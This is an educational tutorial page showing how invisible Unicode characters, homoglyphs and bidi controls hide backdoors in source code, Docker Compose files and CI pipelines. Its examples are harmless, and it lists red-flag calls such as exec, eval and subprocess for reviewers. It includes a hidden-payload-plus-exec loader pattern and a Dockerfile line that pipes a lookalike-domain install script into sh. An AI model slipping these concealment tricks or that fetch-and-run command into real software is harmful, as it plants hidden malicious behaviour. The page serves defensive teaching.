# 4.2 Attacks in source code and config

> Educational content. Every example here is harmless (it prints or returns a string). The point is to show what reviewers miss, so you know what to look for.

[4.1](01-hiding-data-in-invisible-characters.md) showed how to hide data. This page shows where hidden characters do damage: source code, configuration files, and build pipelines. The examples use `\uXXXX` escapes; in a real attack the raw characters would be in the file and you would see nothing.

## 1. Invisible identifiers

Because Hangul fillers are letters ([2.1](../02-tricky-unicode/01-invisible-characters.md)), they can be variable, parameter, and function names. In 2021, Certitude published "The Invisible JavaScript Backdoor" built on exactly this. A harmless version:

```text
function greet({ name, \u3164 }) {
  return ['Hello', name, \u3164].filter(Boolean).join(' ');
}
greet({ name: 'Ana' });                         // 'Hello Ana'
greet({ name: 'Ana', '\u3164': '(injected)' });  // 'Hello Ana (injected)'
```

What the reviewer sees in the raw file (each blank is one HANGUL FILLER):

```text
function greet({ name,   }) {
  return ['Hello', name,  ].filter(Boolean).join(' ');
}
```

Trailing commas and stray spaces look like formatting noise. In reality, the function accepts a second, invisible parameter from its caller (for example from a query string) and uses it. In the published backdoor, that invisible value was added to a list of commands to execute.

Where blank identifiers are accepted:

| Language           | `\u3164` as identifier                   | Notes                                                                                                 |
| ------------------ | ---------------------------------------- | ----------------------------------------------------------------------------------------------------- |
| JavaScript         | yes                                      | Variables, parameters, properties, destructuring                                                      |
| Python             | yes                                      | Normalized by NFKC to U+1160, still blank                                                             |
| Bash               | function names: yes; variable names: no  | `export FOO\u3164=1` fails with "not a valid identifier", but `f\u3164() { ...; }` defines a function |
| Go, Rust, Java, C# | yes (letters are allowed in identifiers) | Rust warns about some confusable and mixed-script identifiers                                         |

## 2. Homoglyph identifiers

Two functions that look identical but are different names (CVE-2021-42694):

```python
def is_admin(user):         # Latin a
    return user.role == "admin"

def is_аdmin(user):    # Cyrillic а (U+0430)
    return True

if is_аdmin(current_user):   # calls the one that always says yes
    ...
```

Reviewers read both names as `is_admin`. Python, JavaScript, and most languages treat them as unrelated identifiers.

## 3. Bidi reordering (Trojan Source)

Bidi controls in strings and comments make code display in a different order than it executes. Covered with a full example in [2.4](../02-tricky-unicode/04-bidirectional-text.md).

## 4. Hidden payload plus a small loader

The pattern from [4.1](01-hiding-data-in-invisible-characters.md) applied to a real file:

```python
payload = "\u3164\uffa0\u3164\u3164 ..."    # hundreds of blank characters
exec(decode(payload))                        # the only visible logic
```

In the editor:

```python
payload = "                                  "
exec(decode(payload))
```

In 2025 security researchers reported this pattern in the wild: malicious npm packages and VS Code extensions (the "GlassWorm" campaign) stored their code in Private Use Area characters or variation selectors, so the payload looked like empty lines or an empty string, with only a short decode-and-eval loader visible.

What gives it away:

- A call to `exec`, `eval`, `Function(...)`, `compile`, `child_process`, `subprocess`, or `sh -c` whose argument is computed, not literal.
- A string literal that is long in bytes but looks short or empty.
- A decode step (`int(..., 2)`, `codePointAt`, `- 0xE0000`, `- 0xE000`) next to that call.

## 5. Configuration files: YAML, Docker, Kubernetes, CI

Configuration is often generated, copied from chat or web pages, and trusted by deployment pipelines. Hidden characters there change meaning without changing appearance. These results were tested with Docker Compose (Docker 28):

### Invisible character in a key

```yaml
services:
  web:
    image: nginx:1.27
    image\u3164: busybox # looks like a duplicate "image" line
```

```text
$ docker compose -f compose.yml config
validating compose.yml: services.web Additional property image\u3164 is not allowed
```

**Caught**, because the Compose schema rejects unknown keys. Schema validation is a real defense for keys.

### Invisible character in a free-form key or value

```yaml
services:
  web:
    image: nginx:1.27
    command: ['sh', '-c', "echo ok\u3164"]
    environment:
      DEBUG: 'false'
      DEBUG\u3164: 'true' # a second, different variable
```

```text
$ docker compose -f compose.yml config | cat -v
    command:
      - sh
      - -c
      - echo okM-cM-^EM-$
    environment:
      DEBUG: "false"
      DEBUGM-cM-^EM-$: "true"
```

**Not caught.** Environment variable names and command strings are free-form, so the schema accepts them. `docker compose config` happily renders the file; only `cat -v` reveals the three hidden bytes. A reviewer sees two `DEBUG` lines and assumes the second is a harmless duplicate.

### Non-ASCII space in indentation

```yaml
services:
  web:
\u00a0   image: nginx # a NO-BREAK SPACE instead of a space
```

```text
validating compose.yml: services.web must be a mapping
```

**Caught as an error**, but a confusing one: YAML only treats ASCII spaces as indentation, so the line is parsed as something else. In a schema-less YAML file (application config read by your own code), the same mistake can silently change the structure instead.

### Homoglyph in an image or URL

```yaml
image: nginх:1.27 # Cyrillic х
```

`docker compose config` accepts it; `docker pull` then fails with `invalid reference format`, because image references must be lowercase ASCII. Strict grammars protect you. Free-form URLs do not:

```dockerfile
RUN curl -fsSL https://pаypal-tools.example/install.sh | sh
```

The URL parser converts the Cyrillic letter to `xn--` and fetches from whoever owns that domain. This is a homograph attack ([3.3](../03-domains/03-homograph-attacks.md)) inside a build file.

### CI pipelines

The same applies to GitHub Actions, GitLab CI, Jenkinsfiles, and Makefiles: `run:` blocks, script arguments, and environment values are free-form strings passed to a shell. Generated files are especially risky, because nobody reads them closely and the pipeline trusts them.

## Summary: where hidden characters change behavior

| Location                  | Effect                                    | Caught by parsing/validation?  |
| ------------------------- | ----------------------------------------- | ------------------------------ |
| Identifiers               | Extra or shadowed variables and functions | No, they are valid identifiers |
| String literals, comments | Hidden payloads, Trojan Source            | No                             |
| Strict config keys        | Unknown key                               | Usually yes (schema)           |
| Free-form keys and values | Extra variables, altered commands         | No                             |
| YAML indentation          | Changed structure or parse error          | Sometimes                      |
| Hostnames and URLs        | Connect to a lookalike domain             | No (it is a valid IDN)         |

The next page turns this into a defense plan.

---

Previous: [4.1 Hiding data in invisible characters](01-hiding-data-in-invisible-characters.md) · Next: [4.3 Detection and defense](03-detection-and-defense.md)
